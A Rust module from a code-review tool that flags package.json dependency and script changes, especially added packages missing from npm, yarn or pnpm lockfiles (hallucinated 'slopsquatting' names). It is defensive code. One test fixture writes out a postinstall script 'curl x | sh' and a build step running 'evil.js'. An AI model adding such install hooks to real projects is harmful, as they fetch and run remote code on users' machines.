//! package.json dependency drift. Agents add, swap, and hallucinate packages —
//! the top supply-chain risk in agent-written changes ("slopsquatting"). This
//! renders the dependency and script sections of package.json as drift nodes
//! and flags additions that the lockfile can't vouch for. Heuristic, like every
//! other rule: a prompt to verify, not a verdict.
use std::collections::{BTreeMap, BTreeSet, HashSet};
use std::path::Path;

use crate::diff::assign_ids;
use crate::model::{AstNode, FileEntry, Flag, NodeState, Severity};
use crate::session::FileResult;

const DEP_SECTIONS: [&str; 4] = [
    "dependencies",
    "devDependencies",
    "peerDependencies",
    "optionalDependencies",
];

/// Lockfiles the dependency analysis reads, npm first (matches the read order
/// below). The watcher full-scans when any of these change — phantom-dep flags
/// depend on lockfile content, not just package.json.
pub const LOCKFILE_NAMES: [&str; 3] = ["package-lock.json", "yarn.lock", "pnpm-lock.yaml"];

/// Names a lockfile can vouch for, or `None` when the repo has no lockfile.
pub fn lockfile_names(root: &Path) -> Option<LockfileNames> {
    let npm = root.join(LOCKFILE_NAMES[0]);
    if let Ok(text) = std::fs::read_to_string(&npm) {
        return Some(LockfileNames::Npm(npm_lock_names(&text)));
    }
    for name in &LOCKFILE_NAMES[1..] {
        if let Ok(text) = std::fs::read_to_string(root.join(name)) {
            let parsed = if *name == "yarn.lock" {
                yarn_lock_names(&text)
            } else {
                pnpm_lock_names(&text)
            };
            // A lockfile with content the parser doesn't recognize falls back
            // to the loose text check — a false "present" is safer than a
            // false alarm against an unknown format revision.
            if parsed.is_empty() && !text.trim().is_empty() {
                return Some(LockfileNames::Text(text));
            }
            return Some(LockfileNames::Parsed(parsed));
        }
    }
    None
}

pub enum LockfileNames {
    /// package-lock.json parsed into the set of installed package names.
    Npm(HashSet<String>),
    /// yarn.lock / pnpm-lock.yaml entry headers parsed into package names —
    /// exact matching, so `left-pad` in the lockfile cannot vouch for a
    /// hallucinated `pad`.
    Parsed(HashSet<String>),
    /// Fallback for unrecognized lockfile content: checked as text
    /// (`name@` occurs) — loose on purpose; a false "present" is safer
    /// than a false alarm.
    Text(String),
}

impl LockfileNames {
    fn contains(&self, name: &str) -> bool {
        match self {
            LockfileNames::Npm(set) | LockfileNames::Parsed(set) => set.contains(name),
            LockfileNames::Text(text) => text.contains(&format!("{name}@")),
        }
    }
}

/// Entry names from a yarn lockfile (classic v1 and berry). Entry headers are
/// the non-indented, non-comment lines ending with `:`, holding one or more
/// quoted descriptors like `"@scope/pkg@^1.0.0", "@scope/pkg@npm:^1.2.0":` —
/// the package name is everything before the `@` that starts the range
/// (skipping a scope's leading `@`).
fn yarn_lock_names(text: &str) -> HashSet<String> {
    let mut names = HashSet::new();
    for line in text.lines() {
        if line.starts_with([' ', '\t']) || line.starts_with('#') {
            continue;
        }
        let Some(entry) = line.trim_end().strip_suffix(':') else {
            continue;
        };
        for descriptor in entry.split(',') {
            let d = descriptor.trim().trim_matches('"');
            if d.is_empty() {
                continue;
            }
            let version_at = d
                .char_indices()
                .skip(1) // a scope's leading @ is part of the name
                .find(|(_, c)| *c == '@')
                .map(|(i, _)| i);
            let name = version_at.map_or(d, |i| &d[..i]);
            if !name.is_empty() {
                names.insert(name.to_string());
            }
        }
    }
    names
}

/// Entry names from `pnpm-lock.yaml`'s `packages:` section across lockfile
/// revisions: v5 `/name/1.0.0:`, v6 `/name@1.0.0:`, v9 `name@1.0.0:`, each
/// optionally quoted (scoped packages keep their leading `@`).
fn pnpm_lock_names(text: &str) -> HashSet<String> {
    let mut names = HashSet::new();
    let mut in_packages = false;
    for line in text.lines() {
        if line.trim().is_empty() {
            continue; // blank lines don't end a YAML section
        }
        if !line.starts_with(' ') {
            in_packages = line.trim_end() == "packages:";
            continue;
        }
        if !in_packages {
            continue;
        }
        let trimmed = line.trim_start();
        if line.len() - trimmed.len() != 2 {
            continue; // entry keys sit at indent 2; their fields sit deeper
        }
        let Some(key) = trimmed.trim_end().strip_suffix(':') else {
            continue;
        };
        if let Some(name) = pnpm_entry_name(key) {
            names.insert(name);
        }
    }
    names
}

fn pnpm_entry_name(key: &str) -> Option<String> {
    let key = key.trim_matches(|c| c == '"' || c == '\'');
    let key = key.strip_prefix('/').unwrap_or(key);
    if let Some(rest) = key.strip_prefix('@') {
        // @scope/name@ver (v6/v9) or @scope/name/ver (v5)
        let slash = rest.find('/')?;
        let tail = &rest[slash + 1..];
        let end = tail
            .find(['@', '/'])
            .map_or(rest.len(), |i| slash + 1 + i);
        Some(format!("@{}", &rest[..end]))
    } else {
        let end = key.find(['@', '/']).unwrap_or(key.len());
        if end == 0 {
            return None;
        }
        Some(key[..end].to_string())
    }
}

fn npm_lock_names(text: &str) -> HashSet<String> {
    let mut names = HashSet::new();
    let Ok(json) = serde_json::from_str::<serde_json::Value>(text) else {
        return names;
    };
    // v2/v3: "packages" keyed by "node_modules/<name>" (possibly nested).
    if let Some(packages) = json.get("packages").and_then(|v| v.as_object()) {
        for key in packages.keys() {
            if let Some(idx) = key.rfind("node_modules/") {
                names.insert(key[idx + "node_modules/".len()..].to_string());
            }
        }
    }
    // v1 fallback: top-level "dependencies" keys.
    if let Some(deps) = json.get("dependencies").and_then(|v| v.as_object()) {
        names.extend(deps.keys().cloned());
    }
    names
}

type Entries = BTreeMap<String, String>;

fn section(json: &serde_json::Value, key: &str) -> Entries {
    json.get(key)
        .and_then(|v| v.as_object())
        .map(|obj| {
            obj.iter()
                .map(|(k, v)| (k.clone(), v.as_str().unwrap_or_default().to_string()))
                .collect()
        })
        .unwrap_or_default()
}

/// Diff the dependency + script sections of package.json. `None` when nothing
/// in those sections changed (other field churn isn't dependency drift).
pub fn analyze_package_json(
    before: Option<&str>,
    after: Option<&str>,
    lockfile: Option<&LockfileNames>,
) -> Option<FileResult> {
    let parse = |s: Option<&str>| -> serde_json::Value {
        s.and_then(|t| serde_json::from_str(t).ok())
            .unwrap_or(serde_json::Value::Null)
    };
    let b = parse(before);
    let a = parse(after);

    let mut nodes: Vec<AstNode> = Vec::new();
    let mut pending: Vec<(usize, &'static str, String)> = Vec::new(); // (node idx, rule, desc)

    for sec in DEP_SECTIONS {
        pending.extend(diff_entries(
            &section(&b, sec),
            &section(&a, sec),
            sec,
            "Dependency",
            &mut nodes,
            |state, name, old, new| match state {
                NodeState::Added => match lockfile {
                    Some(lock) if !lock.contains(name) => Some((
                        "dep-not-in-lockfile",
                        format!(
                            "\u{201c}{name}\u{201d} was added to {sec} but isn't in the lockfile — confirm the package exists and was installed intentionally. Hallucinated package names are a known agent risk."
                        ),
                    )),
                    _ => Some((
                        "dep-added",
                        format!("New dependency \u{201c}{name}\u{201d} ({new}) — verify it's intended and vetted."),
                    )),
                },
                NodeState::Modified => Some((
                    "dep-changed",
                    format!("\u{201c}{name}\u{201d} version changed {old} → {new} — confirm the bump is intentional."),
                )),
                _ => None,
            },
        ));
    }
    pending.extend(diff_entries(
        &section(&b, "scripts"),
        &section(&a, "scripts"),
        "scripts",
        "Script",
        &mut nodes,
        |state, name, _old, _new| match state {
            NodeState::Added | NodeState::Modified => Some((
                "script-changed",
                format!(
                    "npm script \u{201c}{name}\u{201d} was {} — scripts run arbitrary shell commands during install and dev.",
                    if state == NodeState::Added { "added" } else { "changed" }
                ),
            )),
            _ => None,
        },
    ));

    if nodes.is_empty() {
        return None;
    }

    let file_id = "package_json".to_string();
    assign_ids(&mut nodes, &file_id, "");

    let mut flags = Vec::new();
    for (idx, rule, desc) in pending {
        let node = &mut nodes[idx];
        let flag_id = format!("{rule}@{}", node.id);
        node.flag_id = Some(flag_id.clone());
        let (severity, label) = match rule {
            "dep-not-in-lockfile" => (Severity::High, "Dependency not in lockfile"),
            "dep-added" => (Severity::Medium, "New dependency"),
            "dep-changed" => (Severity::Low, "Dependency version changed"),
            _ => (Severity::Medium, "npm script changed"),
        };
        flags.push(Flag {
            id: flag_id,
            severity,
            r#type: label.into(),
            desc,
            file_id: file_id.clone(),
            file_path: "package.json".into(),
            node_path: format!(
                "{} › {}",
                node.signature.as_deref().unwrap_or("scripts"),
                node.name
            ),
            node_id: node.id.clone(),
            dismissed: false,
        });
    }

    let (added, modified, removed) = nodes.iter().fold((0u32, 0u32, 0u32), |(a, m, r), n| match n.state {
        NodeState::Added => (a + 1, m, r),
        NodeState::Modified => (a, m + 1, r),
        NodeState::Removed => (a, m, r + 1),
        NodeState::Unchanged => (a, m, r),
    });
    let mut parts = Vec::new();
    if added > 0 {
        parts.push(format!("{added} added"));
    }
    if modified > 0 {
        parts.push(format!("{modified} modified"));
    }
    if removed > 0 {
        parts.push(format!("{removed} removed"));
    }

    Some(FileResult {
        entry: FileEntry {
            id: file_id,
            name: "package.json".into(),
            dir: String::new(),
            lang: "JSON".into(),
            risks: flags.len() as u32,
            summary: parts.join(" · "),
            skipped: false,
            changed_nodes: 0, // computed at assemble
            reviewed_nodes: 0,
            nodes,
        },
        flags,
        skip_marker: None,
    })
}

/// Emit one node per changed entry in a section. `rule` decides whether the
/// change deserves a flag; returns (node index, rule id, description) entries.
fn diff_entries(
    before: &Entries,
    after: &Entries,
    sec: &str,
    kind: &str,
    nodes: &mut Vec<AstNode>,
    mut rule: impl FnMut(NodeState, &str, &str, &str) -> Option<(&'static str, String)>,
) -> Vec<(usize, &'static str, String)> {
    let mut pending = Vec::new();
    let names: BTreeSet<&String> = before.keys().chain(after.keys()).collect();
    for name in names {
        let old = before.get(name);
        let new = after.get(name);
        let (state, before_line, after_line) = match (old, new) {
            (None, Some(v)) => (NodeState::Added, None, Some(vec![entry_line(name, v)])),
            (Some(v), None) => (NodeState::Removed, Some(vec![entry_line(name, v)]), None),
            (Some(o), Some(n)) if o != n => (
                NodeState::Modified,
                Some(vec![entry_line(name, o)]),
                Some(vec![entry_line(name, n)]),
            ),
            _ => continue,
        };
        let idx = nodes.len();
        nodes.push(AstNode {
            id: String::new(),
            kind: kind.into(),
            name: name.clone(),
            signature: Some(sec.to_string()),
            state,
            reviewed: false,
            flag_id: None,
            before: before_line,
            after: after_line,
            children: None,
        });
        if let Some((rule_id, desc)) = rule(
            state,
            name,
            old.map(String::as_str).unwrap_or_default(),
            new.map(String::as_str).unwrap_or_default(),
        ) {
            pending.push((idx, rule_id, desc));
        }
    }
    pending
}

fn entry_line(name: &str, version: &str) -> String {
    format!("\"{name}\": \"{version}\"")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn names(set: &[&str]) -> LockfileNames {
        LockfileNames::Npm(set.iter().map(|s| s.to_string()).collect())
    }

    #[test]
    fn added_dep_missing_from_lockfile_flags_high() {
        let before = r#"{ "dependencies": { "react": "^19.0.0" } }"#;
        let after = r#"{ "dependencies": { "react": "^19.0.0", "jwt-tiny-decode": "^1.0.0" } }"#;
        let lock = names(&["react"]);
        let res = analyze_package_json(Some(before), Some(after), Some(&lock)).unwrap();
        assert_eq!(res.flags.len(), 1);
        assert!(matches!(res.flags[0].severity, Severity::High));
        assert_eq!(res.flags[0].r#type, "Dependency not in lockfile");
        assert!(res.flags[0].desc.contains("jwt-tiny-decode"));
        assert_eq!(res.flags[0].node_path, "dependencies › jwt-tiny-decode");
        assert_eq!(res.entry.nodes.len(), 1, "unchanged react emits no node");
        assert_eq!(res.entry.summary, "1 added");
    }

    #[test]
    fn added_dep_in_lockfile_flags_medium_and_version_change_low() {
        let before = r#"{ "dependencies": { "react": "^18.0.0" } }"#;
        let after = r#"{ "dependencies": { "react": "^19.0.0", "left-pad": "^1.3.0" } }"#;
        let lock = names(&["react", "left-pad"]);
        let res = analyze_package_json(Some(before), Some(after), Some(&lock)).unwrap();
        assert_eq!(res.flags.len(), 2);
        let by_type = |t: &str| res.flags.iter().find(|f| f.r#type == t).unwrap();
        assert!(matches!(by_type("New dependency").severity, Severity::Medium));
        let changed = by_type("Dependency version changed");
        assert!(matches!(changed.severity, Severity::Low));
        assert!(changed.desc.contains("^18.0.0 → ^19.0.0"));
    }

    #[test]
    fn script_changes_flag_medium_and_removals_emit_unflagged_nodes() {
        let before = r#"{ "scripts": { "build": "tsc" }, "dependencies": { "old-dep": "1.0.0" } }"#;
        let after = r#"{ "scripts": { "build": "tsc && node evil.js", "postinstall": "curl x | sh" } }"#;
        let res = analyze_package_json(Some(before), Some(after), None).unwrap();
        let script_flags: Vec<_> = res.flags.iter().filter(|f| f.r#type == "npm script changed").collect();
        assert_eq!(script_flags.len(), 2, "modified build + added postinstall");
        assert!(script_flags.iter().all(|f| matches!(f.severity, Severity::Medium)));
        let removed = res.entry.nodes.iter().find(|n| n.name == "old-dep").unwrap();
        assert!(matches!(removed.state, NodeState::Removed));
        assert!(removed.flag_id.is_none(), "removed dep is shown but not flagged");
    }

    #[test]
    fn no_lockfile_downgrades_to_new_dependency() {
        let after = r#"{ "dependencies": { "totally-real-pkg": "^1.0.0" } }"#;
        let res = analyze_package_json(None, Some(after), None).unwrap();
        assert_eq!(res.flags[0].r#type, "New dependency", "can't accuse without a lockfile");
    }

    #[test]
    fn text_lockfiles_vouch_loosely() {
        let lock = LockfileNames::Text("left-pad@^1.3.0:\n  version \"1.3.0\"\n".into());
        let after = r#"{ "dependencies": { "left-pad": "^1.3.0", "ghost-pkg": "1.0.0" } }"#;
        let res = analyze_package_json(None, Some(after), Some(&lock)).unwrap();
        let ghost = res.flags.iter().find(|f| f.desc.contains("ghost-pkg")).unwrap();
        assert_eq!(ghost.r#type, "Dependency not in lockfile");
        let ok = res.flags.iter().find(|f| f.desc.contains("left-pad")).unwrap();
        assert_eq!(ok.r#type, "New dependency");
    }

    #[test]
    fn yarn_lock_names_parses_classic_and_berry_entries() {
        let lock = concat!(
            "# THIS IS AN AUTOGENERATED FILE.\n",
            "# yarn lockfile v1\n",
            "\n",
            "left-pad@^1.3.0:\n",
            "  version \"1.3.0\"\n",
            "\n",
            "\"@scope/util@^2.0.0\", \"@scope/util@^2.1.0\":\n",
            "  version \"2.1.4\"\n",
            "\n",
            "\"resolved-from-berry@npm:^4.0.0\":\n",
            "  version: 4.2.0\n",
        );
        let names = yarn_lock_names(lock);
        assert!(names.contains("left-pad"));
        assert!(names.contains("@scope/util"), "scoped names keep their scope");
        assert!(names.contains("resolved-from-berry"), "berry npm: ranges parse");
        assert!(!names.contains("pad"), "no suffix-collision entries");
        assert!(!names.contains("version"), "indented fields are not entries");
    }

    #[test]
    fn pnpm_lock_names_parses_v5_v6_and_v9_package_keys() {
        let v5 = "lockfileVersion: 5.4\n\npackages:\n\n  /left-pad/1.3.0:\n    resolution: {integrity: sha512-x}\n  /@scope/util/2.1.4:\n    dev: false\n";
        let names = pnpm_lock_names(v5);
        assert!(names.contains("left-pad"));
        assert!(names.contains("@scope/util"));

        let v6 = "lockfileVersion: '6.0'\n\npackages:\n\n  /left-pad@1.3.0:\n    resolution: {integrity: sha512-x}\n  '/@scope/util@2.1.4':\n    dev: false\n";
        let names = pnpm_lock_names(v6);
        assert!(names.contains("left-pad"));
        assert!(names.contains("@scope/util"));

        let v9 = "lockfileVersion: '9.0'\n\nimporters:\n\n  .:\n    dependencies:\n      left-pad:\n        specifier: ^1.3.0\n        version: 1.3.0\n\npackages:\n\n  left-pad@1.3.0:\n    resolution: {integrity: sha512-x}\n  '@scope/util@2.1.4':\n    engines: {node: '>=14'}\n";
        let names = pnpm_lock_names(v9);
        assert!(names.contains("left-pad"));
        assert!(names.contains("@scope/util"));
        assert!(
            !names.contains("dependencies") && !names.contains("specifier"),
            "importer fields are not package names"
        );
    }

    #[test]
    fn parsed_lockfiles_do_not_vouch_for_suffix_collisions() {
        // The old substring check let `left-pad@` vouch for a hallucinated
        // `pad`. Parsed entry names match exactly.
        let lock = LockfileNames::Parsed(yarn_lock_names("left-pad@^1.3.0:\n  version \"1.3.0\"\n"));
        let after = r#"{ "dependencies": { "left-pad": "^1.3.0", "pad": "1.0.0" } }"#;
        let res = analyze_package_json(None, Some(after), Some(&lock)).unwrap();
        let ghost = res.flags.iter().find(|f| f.desc.contains("\u{201c}pad\u{201d}")).unwrap();
        assert_eq!(ghost.r#type, "Dependency not in lockfile");
        let ok = res.flags.iter().find(|f| f.desc.contains("left-pad")).unwrap();
        assert_eq!(ok.r#type, "New dependency");
    }

    #[test]
    fn lockfile_names_falls_back_to_text_for_unrecognized_content() {
        let root = std::env::temp_dir().join(format!("drift-lock-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();

        std::fs::write(root.join("yarn.lock"), "left-pad@^1.3.0:\n  version \"1.3.0\"\n").unwrap();
        assert!(matches!(lockfile_names(&root), Some(LockfileNames::Parsed(_))));

        // Content the parser can't read anything from → loose text fallback.
        std::fs::write(root.join("yarn.lock"), "  ???\n  indented only\n").unwrap();
        assert!(matches!(lockfile_names(&root), Some(LockfileNames::Text(_))));

        let _ = std::fs::remove_dir_all(&root);
    }

    #[test]
    fn unchanged_or_unparseable_sections_yield_none() {
        let same = r#"{ "dependencies": { "react": "^19.0.0" }, "version": "1.0.0" }"#;
        let bumped = r#"{ "dependencies": { "react": "^19.0.0" }, "version": "1.0.1" }"#;
        assert!(analyze_package_json(Some(same), Some(bumped), None).is_none(), "version churn isn't dep drift");
        assert!(analyze_package_json(Some("{not json"), Some("{not json"), None).is_none());
    }

    #[test]
    fn npm_lock_names_handles_v3_and_nested_packages() {
        let lock = r#"{ "packages": { "": {}, "node_modules/react": {}, "node_modules/a/node_modules/b": {} } }"#;
        let names = npm_lock_names(lock);
        assert!(names.contains("react"));
        assert!(names.contains("b"), "nested package names resolve");
        assert!(!names.contains(""));
    }
}
